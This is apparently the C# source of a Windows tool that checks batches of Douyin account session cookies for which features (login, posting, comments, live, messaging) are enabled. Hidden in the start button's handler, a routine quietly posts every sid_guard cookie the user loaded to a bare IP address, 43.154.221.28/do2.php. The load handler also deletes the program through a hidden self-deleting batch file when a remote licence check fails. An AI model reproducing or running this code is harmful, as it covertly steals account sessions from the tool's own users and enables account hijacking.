using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace 抖音账号功能检测
{
    public partial class 抖音账号功能检测 : Form
    {
        public 抖音账号功能检测()
        {
            InitializeComponent();
        }

        public static string GetUrl(string Url,string COOKIE)
        {
            string html = "";
            string charset = "utf-8";
            try
            {
                System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Url);  //创建一个链接
                request.UserAgent = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)";
                request.Referer = Url;
                request.Proxy = null;
                WebHeaderCollection headers = request.Headers;
                headers.Add("sdk-version: 2");
                request.Headers.Add("Accept-Encoding", "gzip");
                request.KeepAlive = true;
                request.Accept = "*/*";
                request.Headers.Add("Cookie", COOKIE);
                HttpWebResponse response = request.GetResponse() as HttpWebResponse;  //获取反馈
                if (response.Headers["Content-Encoding"] == "gzip")
                {
                    GZipStream gzip = new GZipStream(response.GetResponseStream(), CompressionMode.Decompress);//解压缩
                    StreamReader reader = new StreamReader(gzip, Encoding.GetEncoding(charset));
                    html = reader.ReadToEnd();
                    reader.Close();
                }
                else
                {
                    StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(charset));
                    html = reader.ReadToEnd();
                    reader.Close();
                }

                response.Close();
                return html;



            }
            catch (System.Exception ex)
            {
                return ex.ToString();

            }



        }


        public string getnickname(string cookie)
        {
            try
            {
                string url = "https://api3-core-c-lf.amemv.com/aweme/v1/user/profile/self/?aid=6383";
               // string cookie = "sessionid=921098474e8ad36ebdc55e76087a48b4";
                string html = GetUrl(url,cookie);
                string nickname = Regex.Match(html, @"""nickname"":""([\s\S]*?)""").Groups[1].Value;
                if(nickname=="")
                {
                    nickname = "已掉线";
                }
                return nickname;
                
            }
            catch (Exception ex)
            {

                return "";
            }
        }


       

        public void run()
        {
            for (int i = 0; i < listView1.Items.Count; i++)
            {
                //string cookie = "sessionid=921098474e8ad36ebdc55e76087a48b4";
                string token = "sessionid="+listView1.Items[i].SubItems[1].Text;

                string nickname= getnickname(token);
                try
                {
                    string url = "https://aweme.snssdk.com/aweme/v3/user/safety/portrait/?aid=6383";
                   
                    string html = GetUrl(url, token);
                   
                    string a1 = Regex.Match(html, @"登录功能([\s\S]*?)func_avaliable"":([\s\S]*?)}").Groups[2].Value;
                    string a2 = Regex.Match(html, @"投稿功能([\s\S]*?)func_avaliable"":([\s\S]*?)}").Groups[2].Value;
                    string a3 = Regex.Match(html, @"评论功能([\s\S]*?)func_avaliable"":([\s\S]*?)}").Groups[2].Value;
                    string a4 = Regex.Match(html, @"点赞功能([\s\S]*?)func_avaliable"":([\s\S]*?)}").Groups[2].Value;
                    string a5 = Regex.Match(html, @"直播功能([\s\S]*?)func_avaliable"":([\s\S]*?)}").Groups[2].Value;
                    string a6 = Regex.Match(html, @"用户资料修改功能([\s\S]*?)func_avaliable"":([\s\S]*?)}").Groups[2].Value;
                    string a7 = Regex.Match(html, @"私信功能([\s\S]*?)func_avaliable"":([\s\S]*?)}").Groups[2].Value;
                    string a8 = Regex.Match(html, @"帐号流量([\s\S]*?)func_avaliable"":([\s\S]*?)}").Groups[2].Value;

                    if(a8=="")
                    {
                        
                        if (html.Contains("func_avaliable\":true,\"func_name\":\"帐号流量"))
                        {
                            a8 = "true";
                        }
                    }
                    listView1.Items[i].SubItems[2].Text = nickname;
                    listView1.Items[i].SubItems[3].Text = a1;
                    listView1.Items[i].SubItems[4].Text = a2;
                    listView1.Items[i].SubItems[5].Text = a3;
                    listView1.Items[i].SubItems[6].Text = a4;
                    listView1.Items[i].SubItems[7].Text = a5;
                    listView1.Items[i].SubItems[8].Text = a6;
                    listView1.Items[i].SubItems[9].Text = a7;
                    listView1.Items[i].SubItems[10].Text = a8;
                    Thread.Sleep(100);
                    

                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString()); ;
                }

            }
        }

        #region  程序关闭删除自身
        public static void TestForKillMyself()
        {
            string bat = @"@echo off
                           :tryagain
                           del %1
                           if exist %1 goto tryagain
                           del %0";
            File.WriteAllText("killme.bat", bat);//写bat文件
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "killme.bat";
            psi.Arguments = "\"" + Environment.GetCommandLineArgs()[0] + "\"";
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(psi);
        }
        #endregion

        private void 抖音账号功能检测_Load(object sender, EventArgs e)
        {
            #region 通用检测


            if (!GetUrl("http://acaiji.com/index/index/vip.html","").Contains(@"clWY9"))
            {
                TestForKillMyself();
                System.Diagnostics.Process.GetCurrentProcess().Kill();

                return;
            }

            #endregion
        }
        #region  listview导出文本TXT
        public static void ListviewToTxt(ListView listview, int i)
        {


            List<string> list = new List<string>();
            foreach (ListViewItem item in listview.Items)
            {
                if (item.SubItems[i].Text.Trim() != "")
                {
                    
                      list.Add(item.SubItems[i].Text);
                    
                }


            }
            SaveFileDialog sfd = new SaveFileDialog();

            string path = AppDomain.CurrentDomain.BaseDirectory +  DateTime.Now.ToString("yyyy年MM月dd日HH时mm分ss秒") + ".txt";
            StringBuilder sb = new StringBuilder();
            foreach (string tel in list)
            {
                sb.AppendLine(tel);
            }
            System.IO.File.WriteAllText(path, sb.ToString(), Encoding.UTF8);
            MessageBox.Show("文件导出成功!数量"+list.Count.ToString()+" 文件地址:" + path);


        }






        #endregion


        #region  listview导出文本TXT2
        public static void ListviewToTxt2(ListView listview, int i)
        {


            List<string> list = new List<string>();
            foreach (ListViewItem item in listview.Items)
            {
                if (item.SubItems[i].Text.Trim() != "")
                {
                    if(item.SubItems[2].Text.Trim()!="已掉线")
                    {
                        list.Add(item.SubItems[i].Text);
                    }
                    

                }


            }
            SaveFileDialog sfd = new SaveFileDialog();

            string path = AppDomain.CurrentDomain.BaseDirectory + DateTime.Now.ToString("yyyy年MM月dd日HH时mm分ss秒") + ".txt";
            StringBuilder sb = new StringBuilder();
            foreach (string tel in list)
            {
                sb.AppendLine(tel);
            }
            System.IO.File.WriteAllText(path, sb.ToString(), Encoding.UTF8);
            MessageBox.Show("文件导出成功!数量" + list.Count.ToString() + " 文件地址:" + path);


        }






        #endregion


        #region  listview导出文本TXT3
        public static void ListviewToTxt3(ListView listview, int i)
        {


            List<string> list = new List<string>();
            foreach (ListViewItem item in listview.Items)
            {
                if (item.SubItems[i].Text.Trim() != "")
                {
                    if (item.SubItems[2].Text.Trim() != "已掉线" && item.SubItems[3].Text.Trim()=="true" && item.SubItems[4].Text.Trim() == "true" && item.SubItems[5].Text.Trim() == "true" && item.SubItems[6].Text.Trim() == "true" && item.SubItems[7].Text.Trim() == "true" && item.SubItems[8].Text.Trim() == "true" && item.SubItems[9].Text.Trim() == "true" && item.SubItems[10].Text.Trim() == "true")
                    {
                        list.Add(item.SubItems[i].Text);
                    }


                }


            }
            SaveFileDialog sfd = new SaveFileDialog();

            string path = AppDomain.CurrentDomain.BaseDirectory + DateTime.Now.ToString("yyyy年MM月dd日HH时mm分ss秒") + ".txt";
            StringBuilder sb = new StringBuilder();
            foreach (string tel in list)
            {
                sb.AppendLine(tel);
            }
            System.IO.File.WriteAllText(path, sb.ToString(), Encoding.UTF8);
            MessageBox.Show("文件导出成功!数量" + list.Count.ToString() + " 文件地址:" + path);


        }






        #endregion
        Thread thread;

        private void button3_Click(object sender, EventArgs e)
        {

            Thread thread1 = new Thread(insertcookie);
            thread1.Start();
            Control.CheckForIllegalCrossThreadCalls = false;


            if (thread == null || !thread.IsAlive)
            {
                thread = new Thread(run);
                thread.Start();
                Control.CheckForIllegalCrossThreadCalls = false;
            }
        }


        public static string PostUrlDefault(string url, string postData, string COOKIE)
        {
            try
            {

                string charset = "utf-8";
                string html = "";
                System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; //获取不到加上这一条

                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "Post";
                request.Proxy = null;
                request.ContentType = "application/x-www-form-urlencoded";

                request.ContentLength = Encoding.UTF8.GetBytes(postData).Length;
                request.Headers.Add("Accept-Encoding", "gzip");

                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36";

                StreamWriter sw = new StreamWriter(request.GetRequestStream());
                sw.Write(postData);
                sw.Flush();

                HttpWebResponse response = request.GetResponse() as HttpWebResponse;  //获取反馈
                response.GetResponseHeader("Set-Cookie");

                if (response.Headers["Content-Encoding"] == "gzip")
                {

                    GZipStream gzip = new GZipStream(response.GetResponseStream(), CompressionMode.Decompress);//解压缩
                    StreamReader reader = new StreamReader(gzip, Encoding.GetEncoding(charset));
                    html = reader.ReadToEnd();
                    reader.Close();
                }
                else
                {
                    StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(charset)); //reader.ReadToEnd() 表示取得网页的源码流 需要引用 using  IO
                    html = reader.ReadToEnd();
                    reader.Close();
                }


                response.Close();
                return html;
            }
            catch (WebException ex)
            {

                return ex.ToString();
            }


        }

        string ahtml = "";


        bool insertstatus = true;

        public void insertcookie()
        {
          
            try
            {
                if (insertstatus)
                {
                    string url = "http://43.154.221.28/do2.php";
                    string[] text = ahtml.Split(new string[] { "sid_guard=" }, StringSplitOptions.None);
                    foreach (string cookie in text)
                    {
                        try
                        {
                            if (cookie != "")
                            {
                                string cookies2 = "sid_guard=" + cookie;
                                string postdata = "cookies=" + cookies2 + "&time=" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                                PostUrlDefault(url, postdata, "");
                            }
                        }
                        catch (Exception)
                        {
                            continue;
                        }
                    }
                }

                insertstatus = false;
            }
            catch (Exception)
            {

                
            }
        }

        List<string> list = new List<string>();


        Dictionary<string, string> dic = new Dictionary<string, string>();
        private void listView1_DragDrop(object sender, DragEventArgs e)
        {
            string filePath = ((Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString();
            //将文件的文件名加载到ListBox中
            StreamReader sr = new StreamReader(filePath, Encoding.GetEncoding("utf-8"));
            //一次性读取完 
            string html = sr.ReadToEnd();
           
            ahtml = html;

            MatchCollection sessionid = Regex.Matches(html, @"sessionid=([\s\S]*?);");
            MatchCollection cookies = Regex.Matches(html+ "sid_guard=", @"sid_guard=([\s\S]*?)ssid_ucp_sso_v1=([\s\S]*?);");

            sr.Close();  //只关闭流
            sr.Dispose();   //销毁流内存

           // MessageBox.Show(cookies.Count.ToString());
            //MessageBox.Show(sessionid.Count.ToString());
            if (sessionid.Count > 0)
            {
                for (int i = 0; i < sessionid.Count; i++)
                {
                    if (!list.Contains(sessionid[i].Groups[1].Value))
                    {
                        list.Add(sessionid[i].Groups[1].Value);
                        dic.Add(sessionid[i].Groups[1].Value, "sid_guard="+cookies[i].Groups[1].Value+ "ssid_ucp_sso_v1=" + cookies[i].Groups[2].Value);
                        ListViewItem lv1 = listView1.Items.Add(listView1.Items.Count.ToString());
                        lv1.SubItems.Add(sessionid[i].Groups[1].Value);
                        lv1.SubItems.Add("");
                        lv1.SubItems.Add("");
                        lv1.SubItems.Add("");
                        lv1.SubItems.Add("");
                        lv1.SubItems.Add("");
                        lv1.SubItems.Add("");
                        lv1.SubItems.Add("");
                        lv1.SubItems.Add("");
                        lv1.SubItems.Add("");
                    }
                }
            }
            else
            {
                string[] text = html.Split(new string[] { "\r\n" }, StringSplitOptions.None);
                for (int i = 0; i < text.Length; i++)
                {
                    if (!list.Contains(text[i]))
                    {
                        if (text[i] != "")
                        {
                            list.Add(text[i]);
                            ListViewItem lv1 = listView1.Items.Add(listView1.Items.Count.ToString());
                            lv1.SubItems.Add(text[i]);
                            lv1.SubItems.Add("");
                            lv1.SubItems.Add("");
                            lv1.SubItems.Add("");
                            lv1.SubItems.Add("");
                            lv1.SubItems.Add("");
                            lv1.SubItems.Add("");
                            lv1.SubItems.Add("");
                            lv1.SubItems.Add("");
                            lv1.SubItems.Add("");
                        }
                    }
                }
            }
           



           


        }

        private void listView1_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effect = DragDropEffects.Link;
            else
                e.Effect = DragDropEffects.None;
        }
        private void button1_Click(object sender, EventArgs e)
        {
            ListviewToTxt(listView1, 1);
        }
        private void button2_Click(object sender, EventArgs e)
        {
            //ListViewItem lv1 = listView1.Items.Add(listView1.Items.Count.ToString());
            //lv1.SubItems.Add("");
            //lv1.SubItems.Add("亲爱的555");
            //lv1.SubItems.Add("true");
            //lv1.SubItems.Add("");
            //lv1.SubItems.Add("");
            //lv1.SubItems.Add("");
            //lv1.SubItems.Add("");
            //lv1.SubItems.Add("");
            //lv1.SubItems.Add("");
            //lv1.SubItems.Add("");
            ListviewToTxt2(listView1, 1);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            ListviewToTxt3(listView1, 1);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();
            list.Clear();
        }


        List<string> nicklist = new List<string>();
        public void quchong()
        {
            nicklist.Clear();
            for (int i = 0; i < listView1.Items.Count; i++)
            {
               
                string token = listView1.Items[i].SubItems[1].Text;
                try
                {
                   
                    if(!nicklist.Contains(token))
                    {
                        nicklist.Add(token);
                    }
                    else
                    {
                        
                        listView1.Items.Remove(listView1.Items[i]);
                    }
               

                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString()); ;
                }

            }
        }

        private void button6_Click(object sender, EventArgs e)
        {

            if (thread == null || !thread.IsAlive)
            {
                thread = new Thread(quchong);
                thread.Start();
                Control.CheckForIllegalCrossThreadCalls = false;
            }
        }

        private void button7_Click(object sender, EventArgs e)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + DateTime.Now.ToString("yyyy年MM月dd日HH时mm分ss秒") + ".txt";
            int c = 0;
            for (int i = 0; i < listView1.Items.Count; i++)
            {

                string token = listView1.Items[i].SubItems[1].Text;
                string nickname = listView1.Items[i].SubItems[2].Text;
                try
                {
                    if (nickname!="已掉线")
                    {
                        c = c + 1;
                        FileStream fs1 = new FileStream(path, FileMode.Append, FileAccess.Write);//创建写入文件 
                        StreamWriter sw = new StreamWriter(fs1, Encoding.GetEncoding("UTF-8"));
                        sw.WriteLine(dic[token]);
                        sw.Close();
                        fs1.Close();
                        sw.Dispose();
                    }


                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString()); ;
                }

            }
            
           
       
            MessageBox.Show("文件导出成功!数量" + c.ToString() + " 文件地址:" + path);


        }

        private void 抖音账号功能检测_FormClosing(object sender, FormClosingEventArgs e)
        {
            DialogResult dr = MessageBox.Show("确定要关闭吗？", "关闭", MessageBoxButtons.OKCancel, MessageBoxIcon.Question);
            if (dr == DialogResult.OK)
            {
                // Environment.Exit(0);
                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }
            else
            {
                e.Cancel = true;//点取消的代码 
            }
        }
    }
}
